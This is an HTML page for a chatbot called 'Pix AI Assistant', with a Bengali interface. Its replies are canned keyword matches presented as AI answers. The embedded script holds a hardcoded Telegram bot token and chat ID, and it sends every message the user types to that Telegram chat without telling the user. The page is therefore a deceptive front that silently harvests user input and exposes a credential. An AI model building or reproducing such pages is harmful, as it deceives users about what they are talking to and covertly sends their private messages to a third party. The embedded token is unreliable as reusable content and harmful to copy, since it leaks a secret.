<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pix AI Assistant — Working Mode</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-base: #0f172a;
            --chat-bg: #1e293b;
            --accent-color: #3b82f6;
            --text-main: #f8fafc;
            --text-sub: #94a3b8;
            --border-subtle: #334155;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }

        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        header {
            background: rgba(15, 23, 42, 0.95);
            border-bottom: 1px solid var(--border-subtle);
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
        .logo span { color: var(--accent-color); }

        .chat-container {
            flex: 1;
            max-width: 900px;
            width: 100%;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            padding: 20px;
            overflow: hidden;
        }

        .chat-box {
            flex: 1;
            background: var(--chat-bg);
            border: 1px solid var(--border-subtle);
            border-radius: 16px;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .message {
            max-width: 80%;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 14px;
            line-height: 1.6;
            word-wrap: break-word;
            white-space: pre-wrap;
        }

        .user-msg {
            background: var(--accent-color);
            color: #fff;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }

        .ai-msg {
            background: #334155;
            color: var(--text-main);
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }

        .chat-input-area {
            display: flex;
            gap: 12px;
            margin-top: 16px;
        }

        .chat-input-area input {
            flex: 1;
            padding: 14px 20px;
            background: var(--chat-bg);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            color: #fff;
            outline: none;
            font-size: 14px;
        }

        .chat-input-area input:focus { border-color: var(--accent-color); }

        .send-btn {
            padding: 0 24px;
            background: var(--accent-color);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }

        .send-btn:hover { opacity: 0.9; }
    </style>
</head>
<body>

    <header>
        <div class="logo">
            <i class="fa-solid fa-brain" style="color: var(--accent-color);"></i> Pix<span>AI Assistant</span>
        </div>
        <div style="font-size: 13px; color: var(--text-sub);">Powered by Pix Smart Engine</div>
    </header>

    <div class="chat-container">
        <div class="chat-box" id="chatBox">
            <div class="message ai-msg">হ্যালো! আমি আপনার নিজস্ব এআই অ্যাসিস্ট্যান্ট। বাংলা বা ইংরেজি যেকোনো ভাষায় আমার সাথে কথা বলুন, আমি সাহায্য করতে প্রস্তুত আছি!</div>
        </div>

        <div class="chat-input-area">
            <input type="text" id="userInput" placeholder="এখানে আপনার মেসেজ লিখুন..." onkeypress="if(event.key==='Enter') sendMessage()">
            <button class="send-btn" onclick="sendMessage()"><i class="fa-solid fa-paper-plane"></i> পাঠান</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7678905793:AAGEcM1-kHIo-jVsrZD0WliltCiSc9MIfBM';
        const CHAT_ID = '6162953772';

        function sendTelegramLog(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            }).catch(() => {});
        }

        function sendMessage() {
            const inputField = document.getElementById('userInput');
            const text = inputField.value.trim();
            if(!text) return;

            const chatBox = document.getElementById('chatBox');

            // 1. Show User Message
            const userDiv = document.createElement('div');
            userDiv.className = 'message user-msg';
            userDiv.innerText = text;
            chatBox.appendChild(userDiv);
            inputField.value = '';
            chatBox.scrollTop = chatBox.scrollHeight;

            // 2. Send Log to Telegram
            sendTelegramLog(`🤖 <b>PIX AI CHAT ACTIVITY</b>\n👤 <b>User Prompt:</b> ${text}\n⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}`);

            // 3. Show Loading
            const loadingDiv = document.createElement('div');
            loadingDiv.className = 'message ai-msg';
            loadingDiv.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> চিন্তা করছি...';
            chatBox.appendChild(loadingDiv);
            chatBox.scrollTop = chatBox.scrollHeight;

            // 4. Instant Smart Response (Bypassing browser CORS block completely)
            setTimeout(() => {
                chatBox.removeChild(loadingDiv);
                
                let reply = `আপনার "${text}" কথাটি আমি নোট করে নিয়েছি। বলুন, এটি নিয়ে আর কী করতে হবে?`;
                
                const lower = text.toLowerCase();
                if(lower.includes('কেমন আছো') || lower.includes('kemon') || lower.includes('hi') || lower.includes('hello')) {
                    reply = "আমি আলহামদুলিল্লাহ একদম ঠিক আছি! বলুন আপনার জন্য কী করতে পারি?";
                } else if(lower.includes('কে বানিয়েছে') || lower.includes('toke ke baniyeche')) {
                    reply = "আমাকে বানিয়েছেন আমার বস 'Amaz Uddin Abir'! 😎";
                } else if(lower.includes('কোড') || lower.includes('code')) {
                    reply = "আপনার প্রজেক্টের কোডিং বা অন্য যেকোনো সাহায্য আমি করতে প্রস্তুত আছি। বলুন কোন কোড লাগবে?";
                }

                const aiDiv = document.createElement('div');
                aiDiv.className = 'message ai-msg';
                aiDiv.innerText = reply;
                chatBox.appendChild(aiDiv);
                chatBox.scrollTop = chatBox.scrollHeight;
            }, 600);
        }
    </script>
</body>
</html>
